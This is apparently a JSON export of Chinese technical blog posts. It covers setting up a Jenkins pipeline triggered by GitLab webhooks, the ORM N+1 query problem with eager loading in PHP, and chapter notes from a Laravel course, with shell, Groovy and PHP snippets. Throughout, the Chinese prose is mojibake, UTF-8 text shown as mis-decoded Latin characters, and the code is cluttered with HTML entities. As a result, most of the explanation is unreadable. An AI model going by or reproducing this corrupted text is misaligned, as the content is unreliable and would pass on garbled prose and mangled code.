éœ€è¦é›†æˆçš„é¡¹ç›®ä¸­ï¼Œè®¾ç½®é›†æˆåŠŸèƒ½ï¼Œå¢åŠ Web é’©å­ã€‚ è¿™æ ·å½“è¿›è¡ŒPush åŠ¨ä½œæ—¶ï¼Œå°±ä¼šè§¦å‘Jenkins è¿›è¡Œæ„å»ºï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„æµæ°´çº¿ã€‚ å¯¹äºå°å…¬å¸è€Œè¨€ï¼Œå¼€å‘æœåŠ¡å™¨å¸¸ç”¨çš„æ¶æ„æ˜¯å†…ç½‘æœåŠ¡å™¨ï¼ˆæœ¬åœ°æœºå™¨ï¼‰+å¤–ç½‘æœåŠ¡å™¨å†…ç½‘ç©¿é€ï¼ŒJenkins + ç§æœ‰Gitlab æŒç»­é›†æˆã€‚ èƒŒæ™¯ï¼šJenkins å’ŒGitlab éƒ¨ç½²åœ¨å¤–ç½‘æœåŠ¡å™¨ä¸Šï¼Œé€šè¿‡å†…ç½‘ç©¿é€å¯¹å†…ç½‘æœåŠ¡å™¨ï¼ˆå¼€å‘æœåŠ¡å™¨ï¼‰è¿›è¡Œè®¿é—®ã€‚éœ€æ±‚æè¿°ï¼šæ¯æ¬¡è¿›è¡ŒPush æ—¶ï¼Œè§¦å‘Jenkins æµæ°´çº¿ï¼Œè¿›è¡Œæ„å»ºï¼Œå°†æœ€æ–°çš„ç‰ˆæœ¬åŒæ­¥åˆ°å¼€å‘æœåŠ¡å™¨ä¸Šã€‚ Jenkinsçš„åŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œè¿™é‡Œå¹¶ä¸æ‰“ç®—æ·±å…¥æ‹“å±•ï¼Œè€Œæ˜¯ä»‹ç»ä¸€ç§ç›¸è¾ƒç®€å•ç²—æš´çš„æ–¹å¼å»å®ŒæˆæŒç»­é›†æˆã€‚ åˆ›å»ºä»»åŠ¡é¦–å…ˆéœ€è¦åœ¨Jenkins ä¸Šæ–°å»ºä»»åŠ¡ï¼Œå› ä¸ºéœ€æ±‚å¹¶ä¸å¤æ‚ï¼Œè¿™é‡Œç›´æ¥é€‰æ‹©æµæ°´çº¿çš„æ–¹å¼ å¦‚æœéœ€è¦å…³è”TAPDï¼Œè¿™é‡Œéœ€è¦ã€Œå…³è”TAPDã€å¡«ä¸Šå¯¹åº”TAPD çš„IDã€‚ æ ¸å¿ƒçš„é…ç½®åœ¨æ„å»ºè§¦å‘å™¨è¿™ä¸€å—ï¼Œæ ¹æ®Push äº‹ä»¶ï¼Œè§¦å‘æ‰§è¡Œæµæ°´çº¿ã€‚ æœ‰ä»¥ä¸‹å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼š å› ä¸ºæ˜¯å¼€å‘æœåŠ¡å™¨ï¼Œå¹¶æ²¡æœ‰å¼€å¯åˆå¹¶è¯·æ±‚ã€‚ Gitlab webhook URL éœ€è¦è®°ä½ï¼Œåé¢ä¼šç”¨åˆ°ã€‚ é»˜è®¤å…è®¸æ‰€æœ‰åˆ†æ”¯ï¼Œå¦‚æœæœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œå¯ä»¥æŒ‡å®šåˆ†æ”¯åè¿›è¡Œè¿‡æ»¤ã€‚ ç‚¹å‡»å³ä¸‹è§’çš„Generate æŒ‰é’®ç”ŸæˆSecret tokenï¼Œåé¢ä¼šç”¨åˆ°ã€‚ é…ç½®æµæ°´çº¿ï¼š ä¸ŠåŠéƒ¨åˆ†æ˜¯è¿æ¥å†…ç½‘æœåŠ¡å™¨ï¼ˆå¼€å‘æœåŠ¡å™¨ï¼‰çš„åŸºç¡€ä¿¡æ¯ï¼Œä¸‹åŠçš„é…ç½®ä¿¡æ¯æ˜¯éœ€è¦æ‰§è¡Œçš„æ„å»ºè„šæœ¬ã€‚ æ„å»ºè„šæœ¬çš„ä½œç”¨å…¶å®å°±æ˜¯å»æ‰§è¡Œgit pull è¿™ä¸ªåŠ¨ä½œï¼Œå¤§æ¦‚é•¿è¿™æ ·ï¼š 1234567#!&#x2F;usr&#x2F;bin&#x2F;bashpull() &#123; cd &#x2F;var&#x2F;www&#x2F;project &amp;&amp; git pull&#125;pull æµæ°´çº¿é…ç½®ï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ä¿¡æ¯ def bdService() { def remote = [:] remote.name = 'hostname' remote.host = 'localhost' remote.port = 22 remote.user = 'username' remote.password = 'password' remote.allowAnyHosts = true return remote } pipeline { agent any stages { stage('ä»£ç é›†æˆ') { steps { script { def remote = bdService(); sshCommand remote: remote, command: \"/bin/bash /opt/shell/build.sh\" } } } } } é…ç½®å®Œæˆä¹‹åï¼Œç‚¹å‡»ä¿å­˜ã€‚ è¿”å›å·¥ä½œæ€ï¼Œæ‰¾åˆ°å¯¹åº”ä»»åŠ¡ï¼Œç‚¹å‡»ç«‹å³æ„å»ºã€‚ é€šè¿‡æ„å»ºå†å²ï¼ŒæŸ¥çœ‹Console Outputï¼Œèƒ½çœ‹åˆ°ç±»ä¼¼è¾“å‡ºåˆ™è¡¨ç¤ºæ„å»ºæˆåŠŸã€‚ æ„å»ºæˆåŠŸä¹‹åï¼Œå°±å¯ä»¥ä¸Gitlab è¿›è¡Œå…³è”äº†ï¼Œç‚¹å‡»é¡¹ç›®=&gt;è®¾ç½®=&gt;é›†æˆã€‚ é“¾æ¥ï¼ˆURLï¼‰æ˜¯ä¹‹å‰çš„ Webhook urlï¼Œå®‰å…¨ä»¤ç‰Œåˆ™æ˜¯ä¸Šé¢ç”Ÿæˆçš„ Secret tokenï¼ŒSSL è¯ä¹¦éªŒè¯è§†æƒ…å†µé€‰æ‹©æ˜¯å¦å¼€å¯ï¼Œç„¶åç‚¹å‡»å¢åŠ Web é’©å­ã€‚ è‡³æ­¤æ‰€æœ‰çš„é…ç½®å°±åŸºæœ¬å®Œæˆäº†ï¼Œè¿™æ—¶å¯ä»¥å»æµ‹è¯•Pushï¼Œçœ‹çœ‹æ˜¯å¦ä¼šæ‰§è¡Œè‡ªåŠ¨æ„å»ºã€‚","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Jenkins","slug":"è¿ç»´/Jenkins","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/Jenkins/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/tags/Jenkins/"},{"name":"CD","slug":"CD","permalink":"https://www.0x2beace.com/tags/CD/"}]},{"title":"ä»€ä¹ˆæ˜¯ N+1 é—®é¢˜ï¼Œä»¥åŠå¦‚ä½•è§£å†³","slug":"what-is-the-n-1-problem-and-how-to-solve-it","date":"2021-03-15T14:10:11.000Z","updated":"2021-03-17T04:42:49.315Z","comments":true,"path":"what-is-the-n-1-problem-and-how-to-solve-it/","link":"","permalink":"https://www.0x2beace.com/what-is-the-n-1-problem-and-how-to-solve-it/","excerpt":"N+1 æ˜¯ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰å…³è”æ•°æ®è¯»å–ä¸­å­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜ã€‚","text":"N+1 æ˜¯ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰å…³è”æ•°æ®è¯»å–ä¸­å­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜ã€‚ åœ¨ä»‹ç»ä»€ä¹ˆæ˜¯N+1é—®é¢˜ä¹‹å‰ï¼Œé¦–å…ˆæ€è€ƒä¸€ä¸ªé—®é¢˜ï¼š å‡è®¾ç°åœ¨æœ‰ä¸€ä¸ªç”¨æˆ·è¡¨ï¼ˆUserï¼‰å’Œä¸€ä¸ªä½™é¢è¡¨ï¼ˆBalanceï¼‰ï¼Œè¿™ä¸¤ä¸ªè¡¨é€šè¿‡user_idè¿›è¡Œå…³è”ã€‚ç°åœ¨æœ‰ä¸€ä¸ªéœ€æ±‚æ˜¯æŸ¥è¯¢å¹´é¾„å¤§äº18å²çš„ç”¨æˆ·ï¼Œä»¥åŠç”¨æˆ·å„è‡ªçš„ä½™é¢ã€‚ è¿™ä¸ªé—®é¢˜å¹¶ä¸éš¾ï¼Œä½†å¯¹äºæ–°æ‰‹è€Œè¨€ï¼Œå¯èƒ½å¸¸å¸¸ä¼šçŠ¯çš„ä¸€ä¸ªé”™è¯¯å°±æ˜¯åœ¨å¾ªç¯ä¸­è¿›è¡ŒæŸ¥è¯¢ã€‚ 12345$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18)-&gt;select();foreach($users as $user)&#123; $balance &#x3D; User::getFieldByUserId($user-&gt;user_id, &quot;balance&quot;); $user[&#39;balance&#39;] &#x3D; $balance;&#125; è¿™æ ·åšæ˜¯éå¸¸ç³Ÿç³•çš„ï¼Œæ•°æ®é‡å°è¿˜å°‘ï¼Œåœ¨æ•°æ®é‡è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼Œæ˜¯éå¸¸æ¶ˆè€—æ•°æ®åº“æ€§èƒ½çš„ã€‚ é€šè¿‡Mysql æŸ¥è¯¢æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°æŸ¥è¯¢ç”¨æˆ·è¡¨æ˜¯ä¸€æ¬¡ï¼Œå› ä¸ºæœ‰å››ä¸ªç¬¦åˆè¯¥æ¡ä»¶çš„ç”¨æˆ·ï¼ŒæŸ¥è¯¢ç”¨æˆ·è¡¨å…³è”çš„ä½™é¢è¡¨æ˜¯å››æ¬¡ã€‚ N+1é—®é¢˜å°±æ˜¯è¿™æ ·äº§ç”Ÿçš„ï¼šæŸ¥è¯¢ä¸»è¡¨æ˜¯ä¸€æ¬¡ï¼ŒæŸ¥è¯¢å‡ºN æ¡è®°å½•ï¼Œæ ¹æ®è¿™N æ¡è®°å½•ï¼ŒæŸ¥è¯¢å…³è”çš„å‰¯ï¼ˆä»ï¼‰è¡¨ï¼Œå…±éœ€è¦N æ¬¡ã€‚æ‰€ä»¥ï¼Œåº”è¯¥å«1+N é—®é¢˜æ›´åˆé€‚ä¸€äº›ã€‚ å…¶å®ï¼Œå¦‚æœç¨å¾®äº†è§£ä¸€ç‚¹SQLï¼Œæ ¹æœ¬ä¸ç”¨è¿™ä¹ˆéº»çƒ¦ï¼Œç›´æ¥ä½¿ç”¨JOIN ä¸€æ¬¡å°±æå®šäº†ã€‚ å¯¹äºè¿™ç±»é—®é¢˜ï¼ŒORM å…¶å®ä¸ºæˆ‘ä»¬æä¾›äº†ç›¸åº”çš„æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯ä½¿ç”¨ã€é¢„åŠ è½½åŠŸèƒ½ã€ã€‚ é¢„åŠ è½½åŠŸèƒ½ä½¿ç”¨with()æ–¹æ³•æŒ‡å®šæƒ³è¦é¢„åŠ è½½çš„å…³è”ï¼š 123$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18) -&gt;with(&quot;hasBalance&quot;) -&gt;select(); hasBalance æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ å®ƒæ˜¯åœ¨Useræ¨¡å‹ä¸­å®šä¹‰çš„ä¸€ä¸ªæ–¹æ³•ï¼š 12345678910class User extends Model&#123; &#x2F;&#x2F; ... &#x2F;&#x2F; Useræ¨¡å‹ä¸Balance æ¨¡å‹è¿›è¡Œä¸€å¯¹ä¸€å…³è” public function hasBalance() &#123; return $this-&gt;hasOne(Balance::class, &quot;user_id&quot;, &quot;user_id&quot;); &#125;&#125; é€šè¿‡è¿™ä¸ªæ–¹æ³•è®©User æ¨¡å‹ä¸Balance æ¨¡å‹è¿›è¡Œä¸€å¯¹ä¸€å…³è”ã€‚ ç°åœ¨å†æ¥çœ‹ä¸€ä¸‹Mysql çš„æŸ¥è¯¢æ—¥å¿—ï¼š å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ï¼Œæ€»æŸ¥è¯¢æ¬¡æ•°ç”±åŸæ¥çš„1+N å˜æˆäº†ç°åœ¨çš„1+1ã€‚ æ€»ç»“N+1 é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿä¼šé€ æˆä»€ä¹ˆå½±å“ï¼Ÿåº”è¯¥å¦‚ä½•è§£å†³ï¼Ÿ æ‰§è¡Œä¸€æ¬¡æŸ¥è¯¢è·å–N æ¡ä¸»æ•°æ®åï¼Œç”±äºå…³è”å¼•èµ·çš„æ‰§è¡ŒN æ¬¡æŸ¥è¯¢ä»æ•°æ® å¸¦æ¥äº†ä¸å¿…è¦çš„æŸ¥è¯¢å¼€é”€ å¯ä»¥é€šè¿‡æ¡†æ¶ ORM è‡ªå¸¦çš„with å»è§£å†³","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"https://www.0x2beace.com/tags/ThinkPHP/"}]},{"title":"L01 Laravel æ•™ç¨‹- Web å¼€å‘å®æˆ˜å…¥é—¨è¯¾ç¨‹ç¬”è®°","slug":"laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development","date":"2021-03-14T04:10:01.000Z","updated":"2021-03-15T14:18:15.623Z","comments":true,"path":"laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/","link":"","permalink":"https://www.0x2beace.com/laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/","excerpt":"L01 Laravel æ•™ç¨‹- Web å¼€å‘å®æˆ˜å…¥é—¨è¯¾ç¨‹ç¬”è®°ã€‚","text":"L01 Laravel æ•™ç¨‹- Web å¼€å‘å®æˆ˜å…¥é—¨è¯¾ç¨‹ç¬”è®°ã€‚ ç¬¬ä¸€ç« æ„å»ºåº”ç”¨ï¼ˆ8.*ï¼‰ï¼š 1$ composer create-project laravel&#x2F;laravel weibo --prefer-dist &quot;8.*&quot; æ„å»ºåº”ç”¨ï¼ˆ5.*ï¼‰ï¼š 1$ composer create-project laravel&#x2F;laravel Laravel --prefer-dist &quot;5.7.*&quot; Ubuntu ä¸­æŸ¥çœ‹æ‰€æœ‰PHP ç‰ˆæœ¬ï¼š 1$ update-alternatives --display php Ubuntu ä¸­å¿«é€Ÿåˆ‡æ¢PHP ç‰ˆæœ¬ï¼š 1$ sudo update-alternatives --config php å·¥ä½œåŸç†ï¼š æ³¨æ„äº‹é¡¹ï¼š è·¯ç”±çš„æœåŠ¡æä¾›è€…ç±»ä¸­è®¾ç½®å‘½åç©ºé—´ blade.php æ˜¯Laravel çš„ä¸€å¥—æ¨¡ç‰ˆå¼•æ“ï¼Œæœ‰è‡ªå·±çš„ä¸€å¥—è§„åˆ™ï¼Œé€šè¿‡ç»§æ‰¿çˆ¶è§†å›¾ï¼Œå¯ä»¥å‡å°‘å¾ˆå¤šé‡å¤ä»£ç  art tinker æ˜¯ Laravel æ¡†æ¶è‡ªå¸¦çš„å‘½ä»¤ï¼Œç”¨ä»¥è°ƒå‡º Laravel çš„äº¤äº’å¼è¿è¡Œæ—¶ artisan å‘½ä»¤Artisan æ˜¯ Laravel æä¾›çš„ CLIï¼ˆå‘½ä»¤è¡Œæ¥å£ï¼‰ã€‚ å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š|å‘½ä»¤|è¯´æ˜||-|-||php artisan key:generate|ç”ŸæˆApp Key||php artisan make:controller|ç”Ÿæˆæ§åˆ¶å™¨||php artisan make:model|ç”Ÿæˆæ¨¡å‹||php artisan make:policy|ç”Ÿæˆæˆæƒç­–ç•¥||php artisan make:seeder|ç”ŸæˆSeeder æ–‡ä»¶||php artisan migrate|æ‰§è¡Œè¿ç§»||php artisan migrate:rollback|å›æ»šè¿ç§»||php artisan migrate:refresh|é‡ç½®æ•°æ®åº“||php artisan db:seed|å¡«å……æ•°æ®åº“||php artisan migrate:refresh â€“seed|è¿›è¡Œæ•°æ®åº“è¿ç§»åŒæ—¶å¡«å……æ•°æ®åº“||php artisan tinker|è¿›å…¥tinker ç¯å¢ƒ||php artisan route:list|æŸ¥çœ‹è·¯ç”±åˆ—è¡¨| ç¬¬ä¸€ç« å­¦åˆ°äº†ä»€ä¹ˆ å¦‚ä½•æ„å»ºä¸€ä¸ªLaravel åº”ç”¨ å¯¹æ–°å»ºçš„Laravel é¡¹ç›®è¿›è¡ŒåŸºæœ¬é…ç½® æ‰‹åŠ¨åˆ›å»ºæ§åˆ¶å™¨ã€é™æ€è§†å›¾ äº†è§£è·¯ç”±ã€æ§åˆ¶å™¨ã€è§†å›¾çš„åŸºæœ¬åä½œæ–¹å¼ äº†è§£å¦‚ä½•ä½¿ç”¨é€šç”¨è§†å›¾ äº†è§£Artisan å‘½ä»¤çš„åŸºæœ¬ä½¿ç”¨ ç¬¬äºŒç« 1$ composer require laravel&#x2F;ui:^3.0 --dev composer require å‘½ä»¤æ˜¯ç”¨æ¥å®‰è£…æ‰©å±•åŒ…çš„å‘½ä»¤ï¼Œå‚æ•°--devè¡¨ç¤ºä»…ä»…åªåœ¨å¼€å‘ç¯å¢ƒä¸­ä½¿ç”¨ã€‚ ä¸Šé¢å‘½ä»¤å®‰è£…å®Œæˆä¹‹åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¼•å…¥ bootstrapï¼š 1$ php artisan ui bootstrap å»ºè®®ä½¿ç”¨yarnå‘½ä»¤ä»£æ›¿npm å‘½ä»¤ï¼š 1$ yarn install å‰ç«¯ä»£ç ç¼–è¯‘å‡ºç°é—®é¢˜æ—¶ï¼Œå¯ä»¥å°è¯•å°†node_moudlesæ–‡ä»¶å¤¹åˆ é™¤ï¼Œå†æ¬¡å®‰è£…ç›¸å…³ä¾èµ–ã€‚ 1$ npm run watch-poll ä¸Šé¢è¿™æ¡å‘½ä»¤çš„ä½œç”¨å…¶å®å°±æ˜¯ç›‘è§†å‰ç«¯æ–‡ä»¶å˜åŒ–ï¼Œå¦‚æœæœ‰å˜åŒ–çš„è¯ï¼Œå°±é©¬ä¸Šç¼–è¯‘ã€‚ ç”Ÿæˆç¯å¢ƒä¸­ï¼Œä¸ºä»€ä¹ˆä¸ç”¨ä¸€ç›´å¼€å¯è¿™ä¸ªå‘½ä»¤ï¼Ÿ è¿™æ˜¯å› ä¸ºæœåŠ¡ç«¯åªéœ€è¦æ‰‹åŠ¨ç¼–è¯‘ä¸€æ¬¡å°±å¥½ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨npm run devå‘½ä»¤ã€‚ ä¹‹æ‰€ä»¥è¯´Laravel æ˜¯å…¨æ ˆæ¡†æ¶ï¼Œå°±æ˜¯å› ä¸ºå®ƒåœ¨ä¸€ä¸ªé¡¹ç›®ä¸­æŠŠå‰ç«¯å’Œåç«¯æ‰€æœ‰ä¸œè¥¿éƒ½åŒ…æ½äº†ã€‚ Laravel çš„å‰ç«¯å·¥ä½œæµLaravel çš„å‰ç«¯å·¥ä½œæµæ˜¯é€šè¿‡ Sassã€NPMã€Yarnã€Laravel Mix æ„æˆä¸€å¥—å‰ç«¯å·¥ä½œæµã€‚ Sass æ˜¯ä¸€ç§å¯ç”¨äºç¼–å†™CSS çš„è¯­è¨€ã€‚ Yarn æ˜¯ä¸€ä¸ªç”¨äºä»£æ›¿NPM å®¢æˆ·ç«¯çš„æ–°çš„åŒ…ç®¡ç†å™¨ã€‚ Laravel Mix æ˜¯ä¸€ä¸ªå‰ç«¯ä»»åŠ¡è‡ªåŠ¨åŒ–ç®¡ç†å·¥å…·ã€‚Laravel Mix å¯ä»¥è‡ªåŠ¨ç¼–è¯‘resourcesä¸‹é¢çš„æ–‡ä»¶ã€‚ åŒæ‹¬å· æ˜¯åœ¨Html ä¸­å†…åµŒPHP çš„Blade è¯­æ³•ï¼Œè¡¨ç¤ºåŒ…å«åœ¨è¯¥åŒºåŸŸå†…çš„ä»£ç ä½¿ç”¨PHP æ¥ç¼–è¯‘æ‰§è¡Œã€‚ ç¬¬äºŒç« å­¦åˆ°äº†ä»€ä¹ˆ Laravel çš„å‰ç«¯å·¥ä½œæµ å±€éƒ¨è§†å›¾çš„è®¢å•å’Œå¼•ç”¨ å‘½åè·¯ç”±çš„å®šä¹‰å’Œä½¿ç”¨ ç¬¬ä¸‰ç« Eloquent ORMå…¶ç‰¹ç‚¹æ˜¯ä¸€ä¸ªæ¨¡å‹å¯¹åº”æ•°æ®åº“ä¸­çš„ä¸€ä¸ªè¡¨ã€‚ åœ¨è¿›è¡Œæ•°æ®åº“è¿ç§»æ—¶ï¼Œup æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œåœ¨è¿›è¡Œæ•°æ®åº“å›æ»šæ—¶ï¼Œdownæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ æ‰€ä»¥æ— è®ºæ˜¯åˆæ¬¡åˆ›å»ºè¡¨ï¼Œè¿˜æ˜¯åé¢å¢åŠ å­—æ®µï¼Œéƒ½éœ€è¦å»up æ–¹æ³•ä¸‹è¿›è¡Œå®šä¹‰ï¼Œè¿™æ ·åœ¨æ•°æ®åº“è¿ç§»æ—¶æ‰ä¼šç”Ÿæ•ˆã€‚ åˆ›å»ºä¸€å¼ è¡¨ï¼š 1$ php artisan make:migration create_followers_table --create&#x3D;&quot;followers&quot; å¢åŠ ä¸€ä¸ªå­—æ®µï¼š 1$ php artisan make:migration add_activation_to_users_table --table&#x3D;users æ•°æ®åº“çš„å›æ»šä¸è¿ç§»ç›´æ¥å¯¹åº”ç€ databases æ–‡ä»¶å¤¹ä¸‹çš„è¿ç§»æ–‡ä»¶ã€‚ åˆ›å»ºæ¨¡å‹çš„åŒæ—¶å¹¶è¿›è¡Œè¿ç§»ï¼š 1$ php artisan make:model Model&#x2F;Articles -m å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ•°æ®åº“äº¤äº’ï¼š 1$ php artisan tinker è¯¥å‘½ä»¤å¯ä»¥è¿›å…¥Eloquent æ¨¡å‹ï¼Œç›´æ¥è¿›è¡Œæ•°æ®åº“äº¤äº’ã€‚åœ¨è¯¥æ¨¡å¼ä¸‹ï¼ŒEloquent æ¨¡å‹çš„æ–¹æ³•å‡å¯ä»¥ä½¿ç”¨ã€‚ ç¬¬ä¸‰ç« å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ Eloquent æ¨¡å‹çš„å®šä¹‰ä¸åº”ç”¨ æ•°æ®åº“è¿ç§»ä¸å›æ»šï¼ˆæ•°æ®è¡¨ç”Ÿæˆä¸åˆ é™¤ï¼‰ æ¨¡å‹çš„åˆ›å»ºä¸ä½¿ç”¨ tinker çš„ä½¿ç”¨ ç¬¬å››ç« åœ¨æœ¬åœ°å¯ä»¥è¿™æ ·è®¿é—®Homestead çš„æ•°æ®åº“ï¼š 1$ mysql -uhomestead -h127.0.0.1 -P33060 -p &#x2F;&#x2F; æˆ–è€… mysql -uhomestead -h192.168.10.10 -P3306 -p ä½†æ˜¯åœ¨é¡¹ç›®ï¼ˆHomesteadï¼‰ä¸­ï¼Œåªèƒ½è¿™æ ·è®¿é—®ï¼š 1$ mysql -uhomestead -h127.0.0.1 -P3360 -p &#x2F;&#x2F; æˆ–è€… mysql -uhomestead -h192.168.10.10 -P3306 -p å› ä¸ºç«¯å£åšäº†æ˜ å°„ï¼ˆHomestead 3306=&gt; ä¸»æœº 33060ï¼‰ï¼Œè€Œé¡¹ç›®åˆè¿è¡Œåœ¨Homestead ä¸­ï¼Œæ‰€ä»¥é¡¹ç›®é…ç½®ä¸­çš„ç«¯å£ä¸èƒ½å†™æˆ33060ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸è®¿é—®ã€‚ éšå½¢è·¯ç”±ç»‘å®šè¿™ä¸ªã€éšå½¢è·¯ç”±ç»‘å®šã€å€’åº•æ˜¯ä¸ªå•¥ç©æ„ï¼Ÿç®€å•ç†è§£å°±æ˜¯é€šè¿‡æ§åˆ¶å™¨æŠŠæ¨¡å‹ç»‘å®šåœ¨è·¯ç”±ä¸­äº†ã€‚ è·¯ç”±ä»£ç ï¼š 1Route::get(&#39;&#x2F;users&#x2F;&#123;user&#125;&#39;, &#39;UsersController@show&#39;)-&gt;name(&#39;users.show&#39;); æ§åˆ¶å™¨åŠæ¨¡å‹ä»£ç ï¼š 12345use App\\Models\\User;public function show (User $user)&#123; return view(&quot;users.show&quot;, compact(&quot;user&quot;)); &#125; ä¸Šé¢è¿™æ®µä»£ç æœ‰å¾ˆå¤šçŸ¥è¯†ç‚¹ï¼š æ§åˆ¶å™¨æ–¹æ³•show æ˜¯é€šè¿‡è·¯ç”±è·å–çš„ User $user æ˜¯å®šä¹‰åœ¨æ§åˆ¶å™¨ä¸­çš„æ–¹æ³•çš„Eloquent æ¨¡å‹ç±»å‹å£°æ˜ ç”±äºshow æ–¹æ³•ä¼ å‚æ—¶å£°æ˜äº†ç±»å‹â€”â€”Eloquent æ¨¡å‹ï¼Œå¯¹åº”çš„å˜é‡å$user ä¼šåŒ¹é…è·¯ç”±ç‰‡æ®µä¸­çš„{user}ï¼Œè¿™æ ·Laravel ä¼šè‡ªåŠ¨æ³¨å…¥ä¸è¯·æ±‚URL ä¼ å…¥çš„ID å¯¹åº”çš„ç”¨æˆ·æ¨¡å‹å®ä¾‹ã€‚ è¿™é‡Œåˆ©ç”¨äº†éšå½¢è·¯ç”±ç»‘å®šï¼Œç›´æ¥è¯»å–å¯¹åº”ID çš„ç”¨æˆ·çš„å®ä¾‹ã€‚ å…¶å®è¿™ä¸ªå’ŒThinkPHP ä¸­çš„è·¯ç”±ä¼ å‚å¾ˆåƒï¼Œåªä¸è¿‡ä¸åŒçš„æ˜¯ThinkPHP ä¸­æ²¡æœ‰å®šä¹‰æ¨¡å‹ã€‚ 12345Route::get(&#39;hello&#x2F;:name&#39;, &#39;index&#x2F;hello&#39;);public function hello($name)&#123; return $name; &#125; Laravel æ˜¯å¦‚ä½•æ¥æ”¶å‰ç«¯çš„å‚æ•°çš„ï¼Ÿ 123public function sotre(Request $request)&#123; &#x2F;&#x2F; é€šè¿‡ä½¿ç”¨Illuminate\\Http\\Request å®ä¾‹æ¥æ¥æ”¶ç”¨æˆ·è¾“å…¥&#125; ç¬¬å››ç« å­¦åˆ°äº†ä»€ä¹ˆ ä½¿ç”¨RESTFUL æ¥æ„å»ºè·¯ç”±èµ„æº é€šè¿‡è¡¨å•ä¸æ§åˆ¶å™¨ååŒå¤„ç†æ•°æ® éªŒè¯è¡¨å•æäº¤çš„æ•°æ®ï¼Œå¹¶è¿”å›ç›¸åº”çš„å†…å®¹ åˆ©ç”¨Composer å®‰è£…ç›¸åº”æ‰©å±•åŒ… ä½¿ç”¨é—ªå­˜æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ ç¬¬äº”ç« Laravel æä¾›äº†attempt æ–¹æ³•ç”¨äºç™»å½•éªŒè¯ã€‚ 123if (Auth::attempt([&#39;email&#39; &#x3D;&gt; $email, &#39;password&#39; &#x3D;&gt; $password])) &#123; &#x2F;&#x2F; è¯¥ç”¨æˆ·å­˜åœ¨äºæ•°æ®åº“ï¼Œä¸”é‚®ç®±å’Œå¯†ç ç›¸ç¬¦åˆ&#125; attempt æ–¹æ³•æ¥æ”¶ä¸€ä¸ªæ•°ç»„ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¼šå»æ•°æ®åº“ä¸­æ‰¾å¯»å¯¹åº”çš„å€¼ï¼Œé€»è¾‘å¦‚ä¸‹ï¼š æ‰¾å¯»emailå­—æ®µåŒ¹é…çš„å€¼ å¦‚æœæ²¡æ‰¾åˆ°ï¼Œç›´æ¥è¿”å›false å¦‚æœèƒ½æ‰¾åˆ°ï¼ši. å…ˆå°†ä¼ å‚passwordè¿›è¡ŒåŠ å¯†ï¼Œä¸æ•°æ®åº“ä¸­çš„å€¼è¿›è¡Œæ¯”å¯¹ii. å¦‚æœä¸¤ä¸ªå€¼åŒ¹é…ï¼Œä¼šåˆ›å»ºä¸€ä¸ªä¼šè¯ç»™éªŒè¯é€šè¿‡çš„ç”¨æˆ·ï¼Œåœ¨ä¼šè¯åˆ›å»ºçš„åŒæ—¶ï¼Œä¹Ÿä¼šç§ä¸‹ä¸€ä¸ªåä¸º laravel_session çš„ HTTP Cookieï¼Œä»¥æ­¤ Cookie æ¥è®°å½•ç”¨æˆ·ç™»å½•çŠ¶æ€ï¼Œæœ€ç»ˆè¿”å› trueiii. å¦‚æœä¸åŒ¹é…ï¼Œè¿”å›false ç™»å½•æˆåŠŸä¹‹åï¼Œå¯ä»¥ä½¿ç”¨Auth::user() è·å–ç”¨æˆ·ä¿¡æ¯ã€‚ 1Route::get(&#39;login&#39;, &#39;SessionsController@create&#39;)-&gt;name(&#39;login&#39;); é€šè¿‡name() æ–¹æ³•å®šä¹‰è·¯ç”±åç§°ï¼Œè¿™æ ·éœ€è¦è®¿é—®è¯¥è·¯ç”±æ—¶ï¼Œç›´æ¥è®¿é—®è¯¥åç§°å°±å¥½ã€‚ ç¬¬äº”ç« å­¦åˆ°äº†ä»€ä¹ˆ Auth è®¤è¯çš„ä½¿ç”¨ äº†è§£Laravel å¸¸ç”¨ç™»å½•æœºåˆ¶çš„å…·ä½“å®ç° é›†æˆBootstrap Javascript ç»„ä»¶ é€šè¿‡ â€œè®°ä½æˆ‘â€ æ¥è®°ä½ç”¨æˆ·ç™»å½•çŠ¶æ€ 